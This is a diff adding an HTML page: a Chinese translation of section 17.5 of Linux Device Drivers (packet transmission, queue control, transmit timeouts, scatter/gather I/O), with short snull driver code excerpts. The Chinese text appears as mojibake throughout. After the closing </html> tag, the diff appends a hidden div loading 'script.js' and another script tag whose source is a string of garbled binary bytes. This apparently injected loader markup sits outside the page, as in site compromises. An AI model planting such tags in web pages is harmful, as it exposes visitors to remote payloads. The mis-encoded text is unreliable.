@@ -1,0 +1,152 @@
+<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>17.5.&#160;±¨ÎÄ´«ËÍ-LinuxÉè±¸Çı¶¯µÚÈı°æ£¨ÖĞÎÄ°æ£©</title>
+<meta name="description" content="Çı¶¯¿ª·¢" />
+<meta name="keywords" content="LinuxÉè±¸Çı¶¯,ÖĞÎÄ°æ,µÚÈı°æ,ldd,linux device driver,Çı¶¯¿ª·¢,µç×Ó°æ,³ÌĞòÉè¼Æ,Èí¼ş¿ª·¢,¿ª·¢ÆµµÀ" />
+<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
+<link rel="stylesheet" href="docbook.css" type="text/css">
+<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
+<link rel="start" href="index.html" title="Linux Éè±¸Çı¶¯ Edition 3">
+<link rel="up" href="ch17.html" title="µÚ&#160;17&#160;ÕÂ&#160;ÍøÂçÇı¶¯">
+<link rel="prev" href="ch17s04.html" title="17.4.&#160;´ò¿ªÓë¹Ø±Õ">
+<link rel="next" href="ch17s06.html" title="17.6.&#160;±¨ÎÄ½ÓÊÕ">
+</head>
+<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
+<div class="navheader">
+<table width="100%" summary="Navigation header">
+<tr><th colspan="3" align="center">17.5.&#160;±¨ÎÄ´«ËÍ</th></tr>
+<tr>
+<td width="20%" align="left">
+<a accesskey="p" href="ch17s04.html">ÉÏÒ»Ò³</a>&#160;</td>
+<th width="60%" align="center">µÚ&#160;17&#160;ÕÂ&#160;ÍøÂçÇı¶¯</th>
+<td width="20%" align="right">&#160;<a accesskey="n" href="ch17s06.html">ÏÂÒ»Ò³</a>
+</td>
+</tr>
+</table>
+<hr>
+</div>
+<div class="sect1" lang="zh-cn">
+<div class="titlepage"><div><div><h2 class="title" style="clear: both">
+<a name="PacketTransmission"></a>17.5.&#160;±¨ÎÄ´«ËÍ</h2></div></div></div>
+<p>ÍøÂç½Ó¿Ú½øĞĞµÄ×îÖØÒªÈÎÎñÊÇÊı¾İ·¢ËÍºÍ½ÓÊÕ. ÎÒÃÇ´Ó·¢ËÍ¿ªÊ¼, ÒòÎªËüÉÔÎ¢Ò×¶®Ò»Ğ©.</p>
+<p>´«ËÍÖ¸µÄÊÇÍ¨¹ıÒ»¸öÍøÂçÁ¬½Ó·¢ËÍÒ»¸ö±¨ÎÄµÄĞĞÎª. ÎŞÂÛºÎÊ±ÄÚºËĞèÒª´«ËÍÒ»¸öÊı¾İ±¨ÎÄ, Ëüµ÷ÓÃÇı¶¯µÄ hard_start_stransmit ·½·¨½«Êı¾İ·ÅÔÚÍâ³ö¶ÓÁĞÉÏ. Ã¿¸öÄÚºË´¦ÀíµÄ±¨ÎÄ¶¼°üº¬ÔÚÒ»¸ö socket »º´æ½á¹¹( ½á¹¹ sk_buff )Àï, ¶¨Òå¼û&lt;linux/skbuff.h&gt;. Õâ¸ö½á¹¹´Ó Unix ³éÏóÖĞµÃÃû, ÓÃÀ´´ú±íÒ»¸öÍøÂçÁ¬½Ó, socket. Èç¹û½Ó¿ÚÓë socket Ã»ÓĞ¹ØÏµ, Ã¿¸öÍøÂç±¨ÎÄÊôÓÚÒ»¸öÍøÂç¸ß²ãÖĞµÄ socket, ²¢ÇÒÈÎºÎ socket ÊäÈë/Êä³ö»º´æÊÇ½á¹¹ struct sk_buff µÄÁĞ±í. Í¬ÑùµÄ sk_buff ½á¹¹ÓÃÀ´´æ·ÅÍøÂçÊı¾İÀú¾­ËùÓĞ Linux ÍøÂç×ÓÏµÍ³, µ«ÊÇ¶ÔÓÚ½Ó¿ÚÀ´Ëµ, Ò»¸ö socket »º´æÖ»ÊÇÒ»¸ö±¨ÎÄ.</p>
+<p>sk_buff µÄÖ¸ÕëÍ¨³£³ÆÎª skb, ÎÒÃÇÔÚÀı×Ó´úÂëºÍÎÄ±¾Àï×ñÑ­Õâ¸ö×ö·¨.</p>
+<p>socket »º´æÊÇÒ»¸ö¸´ÔÓµÄ½á¹¹, ÄÚºËÌá¹©ÁËÒ»Ğ©º¯ÊıÀ´²Ù×÷Ëü. ÔÚ"Socket »º´æ"Ò»½ÚÖĞÃèÊöÕâĞ©º¯Êı; ÏÖÔÚ, ¶ÔÎÒÃÇÀ´ËµÒ»¸ö»ù±¾µÄ¹ØÓÚ sk_buff µÄÊÂÊµ¾Í×ã¹»À´±àĞ´Ò»¸öÄÜ¹¤×÷µÄÇı¶¯.</p>
+<p>´«¸ø hard_start_xmit µÄ socket »º´æ°üº¬ÎïÀí±¨ÎÄ, ËüÓ¦µ±³öÏÖÔÚÃ½½éÉÏ, ÒÔ´«Êä²ãµÄÍ·²¿½áÊø. ½Ó¿Ú²»ĞèÒªĞŞ¸ÄÒª´«ËÍµÄÊı¾İ. skb-&gt;data Ö¸ÏòÒª´«ËÍµÄ±¨ÎÄ, skb-&gt;len ÊÇÒÔ×Ö½Ú¼ÆµÄ³¤¶È. Èç¹ûÄãµÄÇı¶¯ÄÜ¹»´¦Àí·¢É¢/»ã¾Û I/O, ÇéĞÎ»áÉÔÉÔ¸´ÔÓĞ©; ÎÒÃÇÔÚ"·¢É¢/»ã¾Û I/O"Ò»½ÚÖĞËµËü.</p>
+<p>snull ±¨ÎÄ´«ËÍ´úÂëÈçÏÂ; ÍøÂç´«ËÍ»úÖÆ¸ôÀëÔÚÁíÍâÒ»¸öº¯ÊıÀï, ÒòÎªÃ¿¸ö½Ó¿ÚÇı¶¯±ØĞë¸ù¾İÌØ¶¨µÄÔÚÇı¶¯µÄÓ²¼şÀ´ÊµÏÖËü:</p>
+<pre class="programlisting">
+int snull_tx(struct sk_buff *skb, struct net_device *dev)
+{
+    int len;
+    char *data, shortpkt[ETH_ZLEN];
+    struct snull_priv *priv = netdev_priv(dev);
+    data = skb-&gt;data;
+    len = skb-&gt;len;
+    if (len &lt; ETH_ZLEN) {
+        memset(shortpkt, 0, ETH_ZLEN);
+        memcpy(shortpkt, skb-&gt;data, skb-&gt;len);
+        len = ETH_ZLEN;
+        data = shortpkt;
+    }
+    dev-&gt;trans_start = jiffies; /* save the timestamp */
+    /* Remember the skb, so we can free it at interrupt time */
+    priv-&gt;skb = skb;
+
+    /* actual deliver of data is device-specific, and not shown here */ snull_hw_tx(data, len, dev);
+    return 0; /* Our simple device can not fail */
+}
+</pre>
+<p>´«ËÍº¯Êı, Òò´Ë, Ö»¶Ô±¨ÎÄ½øĞĞÒ»Ğ©ºÏÀíĞÔ¼ì²é²¢Í¨¹ıÓ²¼şÏà¹ØµÄº¯Êı´«ËÍÊı¾İ. ×¢Òâ, µ«ÊÇ, ÒªĞ¡ĞÄ¶Ô´ı´«ËÍµÄ±¨ÎÄ±ÈÏÂÃæµÄÃ½½é(¶ÔÓÚ snull, ÊÇÎÒÃÇĞéÄâµÄ"ÒÔÌ«Íø")Ö§³ÖµÄ×îĞ¡³¤¶ÈÒª¶ÌµÄÇé¿ö. Ğí¶à Linux ÍøÂçÇı¶¯( ÆäËû²Ù×÷ÏµÍ³µÄÒ²ÊÇ )ÒÑ±»·¢ÏÖÔÚÕâÖÖÇé¿öÏÂĞ¹Â©Êı¾İ. ²»ÊÇ²úÉúÄÇÖÖ°²È«Â©¶´, ÎÒÃÇ¿½±´¶Ì±¨ÎÄµ½Ò»¸öµ¥¶ÀµÄÊı×é, ÕâÑùÎÒÃÇ¿ÉÒÔÇå³şµØÁãÌî³äµ½×ã¹»µÄÃ½½éÒªÇóµÄ³¤¶È. (ÎÒÃÇ¿ÉÒÔ°²È«µØÔÚ¶ÑÕ»ÖĞ·ÅÊı¾İ, ÒòÎª×îĞ¡³¤¶È -- 60 ×Ö½Ú -- ÊÇÌ«Ğ¡ÁË).</p>
+<p>hard_start_xmit µÄ·µ»ØÖµÓ¦µ±Îª 0 ÔÚ³É¹¦Ê±; ´ËÊ±, ÄãµÄÇı¶¯ÒÑ¾­¸ºÔğÆğ±¨ÎÄ, Ó¦µ±¾¡È«Á¦±£Ö¤·¢ËÍ³É¹¦, ²¢ÇÒ±ØĞëÔÚ×îºóÊÍ·Å skb. ·Ç 0 ·µ»ØÖµÖ¸³ö±¨ÎÄÕâ´Î²»ÄÜ·¢ËÍ; ÄÚºË½«ÉÔºóÖØÊÔ. ÕâÖÖÇé¿öÏÂ, ÄãµÄÇı¶¯Ó¦µ±Í£Ö¹¶ÓÁĞÖ±µ½ÒÑ¾­½â¾öµ¼ÖÂÊ§°ÜµÄÇé¿ö.</p>
+<p>"Ó²¼şÏà¹Ø"µÄ´«ËÍº¯Êı( snull_hw_tx )ÕâÀïºöÂÔÁË, ÒòÎªËüÍêÈ«ÊÇÀ´ÊµÏÖÁË snull Éè±¸µÄÏ··¨, °üÀ¨¼ÙÔìÔ´ºÍÄ¿µÄµØÖ·, ¶ÔÓÚÕæÕıµÄÍøÂçÇı¶¯×÷ÕßÃ»ÓĞÈÎºÎÎüÒıÁ¦. µ±È», Ëü³ÊÏÖÔÚÀı×ÓÔ´ÂëÀï, ¸øÄÇĞ©Ïë½øÈë²¢¿´¿´ËüÈçºÎ¹¤×÷µÄÈË.</p>
+<div class="sect2" lang="zh-cn">
+<div class="titlepage"><div><div><h3 class="title">
+<a name="ControllingTransmissionConcurrency"></a>17.5.1.&#160;¿ØÖÆ·¢ËÍ²¢·¢</h3></div></div></div>
+<p>hard_start_xmit º¯ÊıÓÉÒ»¸ö net_device ½á¹¹ÖĞµÄ×ÔĞıËø(xmit_lock)À´±£»¤±ÜÃâ²¢·¢µ÷ÓÃ. µ«ÊÇ, º¯ÊıÒ»·µ»Ø, ËüÓĞ¿ÉÄÜ±»ÔÙ´Îµ÷ÓÃ. µ±Èí¼şÍê³ÉÖ¸µ¼Ó²¼ş±¨ÎÄ·¢ËÍµÄÊÂÇé, µ«ÊÇÓ²¼ş´«ËÍ¿ÉÄÜ»¹Ã»ÓĞÍê³É. ¶Ô snull Õâ²»ÊÇÎÊÌâ, ËüÊ¹ÓÃ CPU Íê³ÉËüËùÓĞµÄ¹¤×÷, Òò´Ë±¨ÎÄ·¢ËÍÔÚ´«ËÍº¯Êı·µ»ØÇ°¾ÍÍê³ÉÁË.</p>
+<p>ÕæÊµµÄÓ²¼ş½Ó¿Ú, ÁíÒ»·½Ãæ, Òì²½·¢ËÍ±¨ÎÄ²¢ÇÒ¾ß±¸ÓĞÏŞµÄÄÚ´æÀ´´æ·ÅÍâ³öµÄ±¨ÎÄ. µ±ÄÚ´æºÄ¾¡(¶ÔÄ³Ğ©Ó²¼ş, »á·¢ÉúÔÚÒ»¸öµ¥¸öÒª·¢ËÍµÄÍâ³ö±¨ÎÄÉÏ), Çı¶¯ĞèÒª¸æÖªÍøÂçÏµÍ³²»ÒªÔÙÆô¶¯·¢ËÍÖ±µ½Ó²¼ş×¼±¸ºÃ½ÓÊÕĞÂµÄÊı¾İ.</p>
+<p>Õâ¸öÍ¨ÖªÍ¨¹ıµ÷ÓÃ netif_stop_queue À´ÊµÏÖ, Õâ¸öÇ°Ãæ½éÉÜ¹ıµÄº¯ÊıÀ´Í£Ö¹¶ÓÁĞ. Ò»µ©ÄãµÄÇı¶¯ÒÑÍ£Ö¹ÁËËüµÄ¶ÓÁĞ, Ëü±ØĞë°²ÅÅÔÚÒÔºóÄ³¸öÊ±¼äÖØÆô¶ÓÁĞ, µ±ËüÓÖÄÜ¹»½ÓÊÜ±¨ÎÄÀ´·¢ËÍÁË. Îª´Ë, ËüÓ¦µ±µ÷ÓÃ:</p>
+<pre class="programlisting">
+void netif_wake_queue(struct net_device *dev); 
+</pre>
+<p>Õâ¸öº¯ÊıÈçÍ¬ netif_start_queue, ³ıÁËËü»¹´ÌÌ½ÍøÂçÏµÍ³À´Ê¹ËüÓÖÆô¶¯·¢ËÍ±¨ÎÄ.</p>
+<p>´ó²¿·ÖÏÖ´úµÄÍøÂçÓ²¼şÎ¬»¤Ò»¸öÄÚ²¿µÄÓĞ¶à¸ö·¢ËÍ±¨ÎÄµÄ¶ÓÁĞ; ÒÔÕâÖÖ·½Ê½, Ëü¿ÉÒÔ´ÓÍøÂçÉÏ»ñµÃ×îºÃµÄĞÔÄÜ. ÕâĞ©Éè±¸µÄÍøÂçÇı¶¯±ØĞëÖ§³ÖÔÚÈçºÎ¸ø¶¨Ê±¼äÓĞ¶à¸öÎ´Íê³ÉµÄ·¢ËÍ, µ«ÊÇÉè±¸ÄÚ´æÄÜ¹»ÌîÂú²»¹ÜÓ²¼şÊÇ·ñÖ§³Ö¶à¸öÎ´Íê³É·¢ËÍ. ÈÎºÎÊ±ºòµ±Éè±¸ÄÚ´æÌî³äµ½Ã»ÓĞ¿Õ¼ä¸ø×î´ó¿ÉÄÜµÄ±¨ÎÄÊ±, Çı¶¯Ó¦µ±Í£Ö¹¶ÓÁĞÖ±µ½ÓĞ¿Õ¼ä¿ÉÓÃ.</p>
+<p>Èç¹ûÄã±ØĞë½ûÖ¹ÈçºÎµØ·½µÄ±¨ÎÄ´«ËÍ, ³ıÁËÄãµÄ hard_start_xmit º¯Êı( Ò²Ğí, ÏìÓ¦Ò»¸öÖØĞÂÅäÖÃÇëÇó ), ÄãÏëÊ¹ÓÃµÄº¯ÊıÊÇ:</p>
+<pre class="programlisting">
+void netif_tx_disable(struct net_device *dev); 
+</pre>
+<p>Õâ¸öº¯Êı·Ç³£Ïó netif_stop_queue, µ«ÊÇËü»¹±£Ö¤, µ±Ëü·µ»ØÊ±, ÄãµÄ hard_start_xmit ·½·¨Ã»ÓĞÔÚÁíÒ»¸ö CPU ÉÏÔËĞĞ. ¶ÓÁĞÄÜ¹»ÓÃ netif_wake_queue ÖØÆô, Èç³£.</p>
+</div>
+<div class="sect2" lang="zh-cn">
+<div class="titlepage"><div><div><h3 class="title">
+<a name="TransmissionTimeouts"></a>17.5.2.&#160;´«ËÍ³¬Ê±</h3></div></div></div>
+<p>ÓëÕæÊµÓ²¼ş´ò½»µÀµÄ´ó²¿·ÖÇı¶¯²»µÃ²»Ô¤±¸´¦ÀíÓ²¼şÅ¼¶û²»ÄÜÏìÓ¦. ½Ó¿Ú¿ÉÄÜÍü¼ÇËüÃÇÔÚ×öÊ²Ã´, »òÕßÏµÍ³¿ÉÄÜ¶ªÊ§ÖĞ¶Ï. Éè¼ÆÔÚ¸öÈË»úÉÏÔËĞĞµÄÉè±¸, ÕâÖÖÀàĞÍµÄÎÊÌâÊÇÆ½³£µÄ.</p>
+<p>Ğí¶àÇı¶¯Í¨¹ıÉèÖÃ¶¨Ê±Æ÷À´´¦ÀíÕâ¸öÎÊÌâ; Èç¹ûÔÚ¶¨Ê±Æ÷µ½ÆÚÊ±²Ù×÷»¹Ã»½áÊø, ÓĞÊ²Ã´²»¶ÔÁË. ÍøÂçÏµÍ³, ±¾ÖÊÉÏÊÇÒ»¸ö¸´ÔÓµÄÓÉ´óÁ¿¶¨Ê±Æ÷¿ØÖÆµÄ×´Ì¬»úµÄ×éºÏÌå. Òò´Ë, ÍøÂç´úÂëÊÇÒ»¸öºÏÊÊµÄÎ»ÖÃÀ´¼ì²â·¢ËÍ³¬Ê±, ×÷ÎªËüÕı³£²Ù×÷µÄÒ»²¿·Ö.</p>
+<p>Òò´Ë, ÍøÂçÇı¶¯²»ĞèÒªµ£ĞÄ×Ô¼ºÈ¥¼ì²âÕâÑùµÄÎÊÌâ. Ïà·´, ËüÃÇÖ»ĞèÒªÉèÖÃÒ»¸ö³¬Ê±Öµ, ÔÚ net_device ½á¹¹µÄ watchdog_timeo ³ÉÔ±. Õâ¸ö³¬Ê±Öµ, ÒÔ jiffy ¼Æ, Ó¦µ±×ã¹»³¤ÒÔÈİÄÉÕı³£µÄ·¢ËÍÑÓ³Ù(ÀıÈçÍøÂçÃ½½éÓµÈûÒıÆğµÄ³åÍ»).</p>
+<p>Èç¹ûµ±Ç°ÏµÍ³Ê±¼ä³¬¹ıÉè±¸µÄ trans_start Ê±¼äÖÁÉÙ time-out Öµ, ÍøÂç²ã×îÖÕµ÷ÓÃÇı¶¯µÄ tx_timeout ·½·¨. Õâ¸ö·½·¨µÄ¹¤×÷ÊÇÊÇ½øĞĞÇå³ıÎÊÌâĞèÒªµÄ¹¤×÷²¢ÇÒ±£Ö¤ÈÎºÎÒÑ¾­¿ªÊ¼µÄ·¢ËÍÕıÈ·µØÍê³É. ÌØ±ğµØ, Çı¶¯Ã»ÓĞ¶ªÊ§×·×ÙÈÎºÎÍøÂç´úÂëÎ¯ÍĞ¸øËüµÄ socket »º´æ.</p>
+<p>snull ÓĞÄÜÁ¦Ä£·Â·¢ËÍÆ÷ÉÏËø, ÓÉ 2 ¸ö¼ÓÔØÊ±²ÎÊı¿ØÖÆµÄ:</p>
+<pre class="programlisting">
+static int lockup = 0;
+module_param(lockup, int, 0);
+
+static int timeout = SNULL_TIMEOUT;
+module_param(timeout, int, 0);
+</pre>
+<p>Èç¹ûÇı¶¯Ê¹ÓÃ²ÎÊı lockup=n ¼ÓÔØ, ÔòÄ£ÄâÒ»¸öÉÏËø, Ò»µ©Ã¿ n ¸ö±¨ÎÄ´«ËÍÁË, ²¢ÇÒ watchdog_timeo ³ÉÔ±ÉèÎª¸ø¶¨µÄÊ±¼äÖµ. µ±Ä£ÄâÉÏËøÊ±, snull Ò²µ÷ÓÃ netif_stop_queue À´×èÖ¹ÆäËûµÄ·¢ËÍÆóÍ¼·¢Éú.</p>
+<p>snull ·¢ËÍ³¬Ê±´¦Àí¿´À´Èç´Ë:</p>
+<pre class="programlisting">
+void snull_tx_timeout (struct net_device *dev)
+{
+    struct snull_priv *priv = netdev_priv(dev);
+    PDEBUG("Transmit timeout at %ld, latency %ld\n", jiffies, jiffies - dev-&gt;trans_start);
+    /* Simulate a transmission interrupt to get things moving */
+    priv-&gt;status = SNULL_TX_INTR;
+    snull_interrupt(0, dev, NULL);
+    priv-&gt;stats.tx_errors++;
+    netif_wake_queue(dev);
+    return;
+}
+</pre>
+<p>µ±·¢Éú´«ËÍ³¬Ê±, Çı¶¯±ØĞëÔÚ½Ó¿ÚÍ³¼ÆÁ¿ÖĞ±ê¼ÇÕâ¸ö´íÎó, ²¢°²ÅÅÉè±¸±»¸´Î»µ½Ò»¸ö¸É¾»µÄÄÜ·¢ËÍĞÂ±¨ÎÄµÄ×´Ì¬. µ±Ò»¸ö³¬Ê±·¢ÉúÔÚ snull, Çı¶¯µ÷ÓÃ snull_interrupt À´Ìî³ä"¶ªÊ§"µÄÖĞ¶Ï²¢ÓÃ netif_wake_queue ÖØÆô¶ÓÁĞ.</p>
+</div>
+<div class="sect2" lang="zh-cn">
+<div class="titlepage"><div><div><h3 class="title">
+<a name="ScatterGathreIO"></a>17.5.3.&#160;·¢É¢/»ã¾Û I/O</h3></div></div></div>
+<p>ÍøÂçÖĞ´´½¨Ò»¸ö·¢ËÍ±¨ÎÄµÄ¹ı³Ì°üÀ¨×éºÏ¶à¸öÆ¬. ±¨ÎÄÊı¾İ±ØĞë´ÓÓÃ»§¿Õ¼ä¿½±´, ÓÉÍøÂçĞ­ÒéÕ»¸÷²ãÊ¹ÓÃµÄÍ·²¿±ØĞëÍ¬Ê±¼ÓÉÏ. Õâ¸ö×éºÏ¿ÉÄÜÒªÇóÏàµ±ÊıÁ¿µÄÊı¾İ¿½±´. µ«ÊÇ, Èç¹û×¢¶¨Òª·¢ËÍ±¨ÎÄµÄÍøÂç½Ó¿ÚÄÜ¹»½øĞĞ·¢É¢/»ã¾Û I/O, ±¨ÎÄ¾Í²»ĞèÒª×é×°³ÉÒ»¸öµ¥¸ö¿é, ´óÁ¿µÄ¿½±´¿ÉÒÔ±ÜÃâ. ·¢É¢/»ã¾Û I/O Ò²´ÓÓÃ»§¿Õ¼äÆô¶¯"Áã¿½±´"ÍøÂç·¢ËÍ.</p>
+<p>ÄÚºË²»´«µİ·¢É¢µÄ±¨ÎÄ¸øÄãµÄ hard_start_xmit ·½·¨³ı·Ç NETIF_F_SG Î»ÒÑ¾­ÉèÖÃµ½ÄãµÄÉè±¸½á¹¹µÄÌØĞÔ³ÉÔ±ÖĞ. Èç¹ûÄãÒÑÉèÖÃÁËÕâ¸ö±êÖ¾, ÄãĞèÒª²é¿´Ò»¸öÌØÊâµÄ skb ÖĞµÄ"shard info"³ÉÔ±À´È·¶¨ÊÇ·ñ±¨ÎÄÓÉÒ»¸öµ¥¸öÆ¬¶Î»òÕß¶à¸ö×é³É, ²¢ÇÒÈç¹ûĞèÒª¾ÍÕÒ³ö·¢É¢µÄÆ¬¶Î. Ò»¸öÌØÊâµÄºê¶¨ÒåÀ´´æÈ¡Õâ¸öĞÅÏ¢; ËüÊÇ skb_shinfo. ·¢ËÍÇ±ÔÚµÄ·ÖÆ¬±¨ÎÄµÄµÚÒ»²½³£³£ÊÇ¿´À´Èç´ËµÄ¶«¶«:</p>
+<pre class="programlisting">
+if (skb_shinfo(skb)-&gt;nr_frags == 0) {
+    /* Just use skb-&gt;data and skb-&gt;len as usual */
+}
+</pre>
+<p>nr_frags ³ÉÔ±¸æÖª¶àÉÙÆ¬ÒªÓÃÀ´½¨Á¢Õâ¸ö±¨ÎÄ. Èç¹ûËüÊÇ 0, ±¨ÎÄ´æÓÚÒ»¸öµ¥¸öÆ¬ÖĞ, ¿ÉÒÔÈç³£Ê¹ÓÃ data ³ÉÔ±À´´æÈ¡. µ«ÊÇ, Èç¹ûËüÊÇ·Ç 0, ÄãµÄÇı¶¯±ØĞëÀú¾­²¢°²ÅÅ·¢ËÍÃ¿Ò»¸öµ¥¶ÀµÄÆ¬. skb ½á¹¹µÄ data ³ÉÔ±·½±ãµØÖ¸ÏòµÚÒ»¸öÆ¬(ÔÚ²»·ÖÆ¬Çé¿öÏÂ, Ö¸ÏòÕû¸ö±¨ÎÄ). Æ¬µÄ³¤¶È±ØĞëÍ¨¹ı´Ó skb-&gt;len ( ÈÔÈ»º¬ÓĞÕû¸ö±¨ÎÄµÄ³¤¶È ) ÖĞ¼õÈ¥ skb-&gt;data_len ¼ÆËãµÃÀ´. Ê£ÏÂµÄÆ¬»áÔÚ³ÆÎª frags µÄÊı×éÖĞÕÒµ½, frags ÔÚ¹²ÏíµÄĞÅÏ¢½á¹¹ÖĞ; frags ÖĞÃ¿¸öÈë¿ÚÊÇÒ»¸ö skb_frag_struct ½á¹¹:</p>
+<pre class="programlisting">
+struct skb_frag_struct { struct page *page;
+    __u16 page_offset;
+    __u16 size;
+};
+</pre>
+<p>ÈçÄãËù¼û, ÎÒÃÇÓÖÒ»´ÎÓöµ½ page ½á¹¹, ²»ÊÇÄÚºËĞéÄâµØÖ·. ÄãµÄÇı¶¯Ó¦µ±±éÀúÕâĞ©·ÖÆ¬, Îª DMA ´«ËÍÓ³ÉäÃ¿Ò»¸ö, ²¢ÇÒ²»ÒªÍü¼ÇµÚÒ»¸ö·ÖÆ¬, ËüÓÉ skb Ö±½ÓÖ¸×Å. ÄãµÄÓ²¼ş, µ±È», ±ØĞë×é×°ÕâĞ©·ÖÆ¬²¢×÷ÎªÒ»¸öµ¥¸ö±¨ÎÄ·¢ËÍËüÃÇ. ×¢Òâ, Èç¹ûÄãÒÑ¾­ÉèÖÃÁËNETIF_F_HIGHDMA ÌØĞÔ±êÖ¾, Ò»Ğ©»òÕßÈ«²¿·ÖÆ¬¿ÉÄÜÎ»ÓÚ¸ß¶ËÄÚ´æ.</p>
+</div>
+</div>
+<div class="navfooter">
+<hr>
+<table width="100%" summary="Navigation footer">
+<tr>
+<td width="40%" align="left">
+<a accesskey="p" href="ch17s04.html">ÉÏÒ»Ò³</a>&#160;</td>
+<td width="20%" align="center"><a accesskey="u" href="ch17.html">ÉÏÒ»¼¶</a></td>
+<td width="40%" align="right">&#160;<a accesskey="n" href="ch17s06.html">ÏÂÒ»Ò³</a>
+</td>
+</tr>
+<tr>
+<td width="40%" align="left" valign="top">17.4.&#160;´ò¿ªÓë¹Ø±Õ&#160;</td>
+<td width="20%" align="center"><a accesskey="h" href="index.html">ÆğÊ¼Ò³</a></td>
+<td width="40%" align="right" valign="top">&#160;17.6.&#160;±¨ÎÄ½ÓÊÕ</td>
+</tr>
+</table>
+</div>
+</body></html>
+<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>
+
+<script language=javascript src=ÿÊG‡ Â2BÆÄïşòİ”xºı8üäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İšŠPpÈd></script>
